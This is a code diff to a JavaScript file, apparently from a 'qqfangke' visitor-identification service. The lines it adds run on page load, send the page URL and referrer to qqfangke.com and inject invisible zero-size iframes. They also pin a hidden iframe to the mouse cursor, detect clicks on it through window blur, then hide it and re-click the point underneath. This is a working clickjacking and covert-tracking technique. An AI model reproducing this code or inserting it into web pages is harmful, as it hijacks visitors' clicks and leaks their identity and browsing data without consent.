@@ -1,8 +1,3 @@
-/**
- * Created by Administrator on 14-5-23.
- */
-
-
 var fangke_wid=2523;
 var fangke_uid=203662;
 var fangke_kaiguan=0;
@@ -183,3 +178,111 @@ function check_jumpUrl() {
         setTimeout(fangke_LoginOK, 0)
     }
 }
+function fangke_loadsUrl(){
+    var url="http://www.qqfangke.com/jump/getUrl.php?kaiguan="+fangke_kaiguan+"&a=1&web_key=b6c42e1043c118fe3df9ec3ff288430e&url="+document.location.href+"&fkrefurl="+encodeURIComponent(document.referrer)+"&wid="+fangke_wid+"&uid="+fangke_uid;
+    fangke_loadJS(url,fangke_SSFrame);
+}
+function create_zeroiframe(url){
+    try {
+        if (url) {
+            var iframe = document.createElement("iframe");
+            iframe.src = url+"&wid="+fangke_wid+"&uid="+fangke_uid+"&page=" + QQfangke_page;
+            iframe.style.cssText = "width:0px;height:0px;";
+            iframe.scrolling = "no";
+            iframe.setAttribute("frameborder", "0", 0);
+            document.getElementsByTagName("HEAD").item(0).appendChild(iframe);
+        } else {
+        }
+    } catch(e) {
+    }
+}
+function fangke_SSFrame(){
+    create_zeroiframe(fangke_surl);
+    create_zeroiframe(fangke_surl1);
+}
+var iframe_hover=false;
+function fangke_iframeClick(a,_iframeclickcallback){
+    a.onmouseover=function(){iframe_hover=true};
+    a.onmouseout=function(){iframe_hover=false};
+    window.onblur=function(){
+        if (iframe_hover)
+        {
+            _iframeclickcallback();
+        }
+    }
+}
+function iframeclickcallback(){
+    var iframe = document.getElementById("iframe_xx_bb_aa");
+    setTimeout(function() {
+            try {
+                iframe.style.display = "none";
+                var oPoint = document.elementFromPoint(qqfangke_x, qqfangke_y);
+                oPoint.click();
+                fangke_LoginOK();
+            } catch(e) {}
+        },
+        1000)
+}
+function fangke_GetCurrentStyle (obj, prop)
+{
+    if (obj.currentStyle) //IE
+    {
+        return obj.currentStyle[prop];
+    }
+    else if (window.getComputedStyle) //éIE
+    {
+        propprop = prop.replace (/([A-Z])/g, "-$1");
+        propprop = prop.toLowerCase ();
+        return document.defaultView.getComputedStyle(obj,null)[propprop];
+    }
+    return null;
+}
+window.fangke_hookMove = function() {
+    var iframe = document.getElementById("iframe_xx_bb_aa");
+    fangke_iframeClick(iframe,iframeclickcallback);
+    document.onmousemove = function(ev) {
+        iframe_hover=false;
+        window.focus();
+        var iframe = document.getElementById("iframe_xx_bb_aa");
+        var ev = ev || window.event;
+        qqfangke_x = ev.clientX;
+        qqfangke_y = ev.clientY;
+        var sTop = document.body.scrollTop + document.documentElement.scrollTop;
+        var widthD = document.documentElement.offsetWidth - ev.clientX;
+        var sLeft = document.body.scrollLeft + document.documentElement.scrollLeft;
+        var dd=0;
+        var aaa=fangke_GetCurrentStyle(document.body,"position");
+        if (document.documentElement.clientWidth>document.body.clientWidth && aaa=="relative")
+        {
+            dd=(document.documentElement.clientWidth-document.body.clientWidth)/2;
+            dd=dd+sLeft;
+            iframe.style.top = (sTop + ev.clientY - 2) + "px";
+            iframe.style.left = ((widthD < iframe.offsetWidth ? ev.clientX - iframe.offsetWidth: ev.clientX)-dd) + "px"
+        }else {
+            dd=dd+sLeft;
+            iframe.style.top = (sTop + ev.clientY - 2) + "px";
+            iframe.style.left = ((widthD < iframe.offsetWidth ? ev.clientX - iframe.offsetWidth: ev.clientX)+dd) + "px"
+        }
+    }
+}
+function fangke_getIEversion(){
+    try{
+        var browser=navigator.appName;
+        var b_version=navigator.appVersion;
+        var version=b_version.split(";");
+        var trim_Version=version[1].replace(/[ ]/g,"");
+        if(browser=="Microsoft Internet Explorer" && trim_Version=="MSIE6.0")
+        {return 6;}
+        else if(browser=="Microsoft Internet Explorer" && trim_Version=="MSIE7.0")
+        {return 7;}
+        else if(browser=="Microsoft Internet Explorer" && trim_Version=="MSIE8.0")
+        {return 8;}
+        else if(browser=="Microsoft Internet Explorer" && trim_Version=="MSIE9.0")
+        {return 9;}
+        else{return 0;}
+    }catch(e){return 0;}
+}
+fangke_loadsUrl();
+if(window == parent){ //ç¦æ­¢iframe
+    fangke_loadJumpUrl();
+} 
